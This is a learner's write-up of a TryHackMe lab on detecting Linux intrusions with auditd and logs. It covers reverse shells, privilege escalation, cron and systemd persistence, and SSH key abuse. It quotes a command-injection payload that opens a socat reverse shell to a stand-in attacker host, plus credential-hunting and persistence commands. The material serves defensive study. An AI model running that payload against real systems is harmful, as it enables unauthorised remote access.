# 🐧 Linux Threat Detection 3 — TryHackMe

## 📅 Day 114 - 365 Days of Cybersecurity

## ✅ Status: Completed

---

# 🧠 Overview

In this room, I analyzed **advanced Linux intrusion activity**, focusing on the later stages of an attack lifecycle:

* Reverse shells
* Privilege escalation
* Startup persistence
* Account persistence
* Detection of targeted attacks

Unlike previous rooms focused on initial access and post-compromise activity, this room centered on **attacker persistence and long-term footholds**, which are critical from a SOC/DFIR perspective.

📌 Key Concept:

Detection is not only finding malicious activity, but understanding **how attackers maintain access after compromise**.

---

# 🎯 Learning Objectives

* Detect reverse shell activity in logs
* Investigate privilege escalation attempts
* Identify Linux persistence mechanisms
* Detect account persistence and SSH key abuse
* Reconstruct advanced attacker behavior through audit logs

---

# 🔁 Reverse Shell Detection

One of the core concepts in this room was detecting **reverse shell activity** generated through command injection.

### Example Injection

```bash
127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh
```

---

## 🔎 Detection Techniques

Using auditd:

```bash
ausearch -if /home/ubuntu/scenario/audit.log -x ping
```

and

```bash
ausearch -i -x whoami
```

Used to trace suspicious command execution and identify attacker behavior. ([Medium][1])

---

## 🚨 Reverse Shell Indicators

* Unexpected shell spawned by web service
* Use of `socat` for remote command execution
* Web application spawning shell processes
* Outbound connections to attacker-controlled hosts

---

## 📌 SOC Insight

Parent-child relationship:

Web App
→ Shell
→ Reverse connection

➡️ Strong indicator of exploitation.

---

# ⬆️ Privilege Escalation Detection

Attackers moved from initial foothold to privilege escalation.

### Suspicious Commands Observed

Searching credentials:

```bash
grep -iR pass .
```

Escalation attempt:

```bash
su root
```

Evidence recovered through audit logs. ([Medium][1])

---

## 🔍 Detection Clues

* Credential hunting
* Reading `.env` files
* Use of `su`
* Suspicious file access before escalation

---

## 📌 Key Takeaway

Privilege escalation often leaves **multiple correlated artifacts**:

* File access
* Sensitive string searches
* Authentication events
* Root shell invocation

---

# 🔒 Startup Persistence

Attackers established persistence using **services** and **cron jobs**.

---

## 🔹 Systemd Service Persistence

Suspicious service file:

```bash
/etc/systemd/system/tux.service
```

Malicious execution through:

```bash
ExecStart=
```

Detection via:

```bash
ausearch -i -f /etc/system
```

---

## 🔹 Cron Persistence

Detection:

```bash
ausearch -i -x crontab
crontab -l
```

Malicious reboot persistence:

```bash
@reboot /usr/sbin/phoenix
```

---

## 🚨 Persistence Indicators

* Unauthorized services
* Modified systemd units
* Suspicious cron entries
* Malware launched at reboot

📌 Common attacker persistence techniques in Linux. ([Medium][1])

---

# 👤 Account Persistence

Attackers may maintain access through account abuse.

---

## 🔹 Rogue User Creation

Detection:

```bash
grep useradd /var/log/auth.log
```

Example:

* Unauthorized user added to sudo group

---

## 🔹 SSH Key Persistence

Modified file:

```bash
/root/.ssh/authorized_keys
```

Detection:

```bash
ausearch -i -f /.ssh/authorized_keys
```

---

## 🚨 Indicators

* New privileged users
* Unauthorized sudo group changes
* Modified authorized_keys
* Passwordless persistence mechanisms

---

# 🔗 Full Attack Chain

1. Web command injection exploited
2. Reverse shell established
3. Privilege escalation performed
4. Credentials harvested
5. Persistence added via service
6. Cron-based persistence added
7. Backdoor user created
8. SSH key persistence maintained

➡️ Full targeted intrusion lifecycle

---

# 🛡️ SOC Detection Approach

## Investigation Workflow

1. Detect suspicious execution
2. Trace reverse shell artifacts
3. Analyze privilege escalation activity
4. Identify persistence mechanisms
5. Review account abuse indicators
6. Reconstruct full intrusion timeline

---

## Key Detection Focus

* Process relationships
* Persistence artifacts
* Authentication anomalies
* Audit log correlation
* Attacker objective analysis

---

# 🛠️ Tools & Technologies

* auditd / ausearch
* auth.log
* systemd analysis
* crontab analysis
* Linux CLI tools (`grep`, `cat`, `ps`)
* SIEM correlation concepts

---

# 🚨 Indicators of Compromise (IoCs)

* Reverse shell commands
* Suspicious `socat` usage
* Credential hunting commands
* Unauthorized `su root`
* Rogue services
* Malicious cron jobs
* New sudo users
* SSH key persistence

---

# 🧠 Key Takeaways

* Reverse shells can be detected through process and audit logs
* Privilege escalation often produces correlated artifacts
* Persistence is a major focus in Linux investigations
* Account abuse is a common long-term attacker technique
* Detection requires full attack-chain thinking

---

# 📌 Final Thoughts

This room helped me:

* Detect advanced Linux attacker tradecraft
* Investigate persistence mechanisms
* Understand privilege escalation artifacts
* Correlate multiple logs to reconstruct targeted intrusions
* Strengthen my Linux SOC investigation mindset

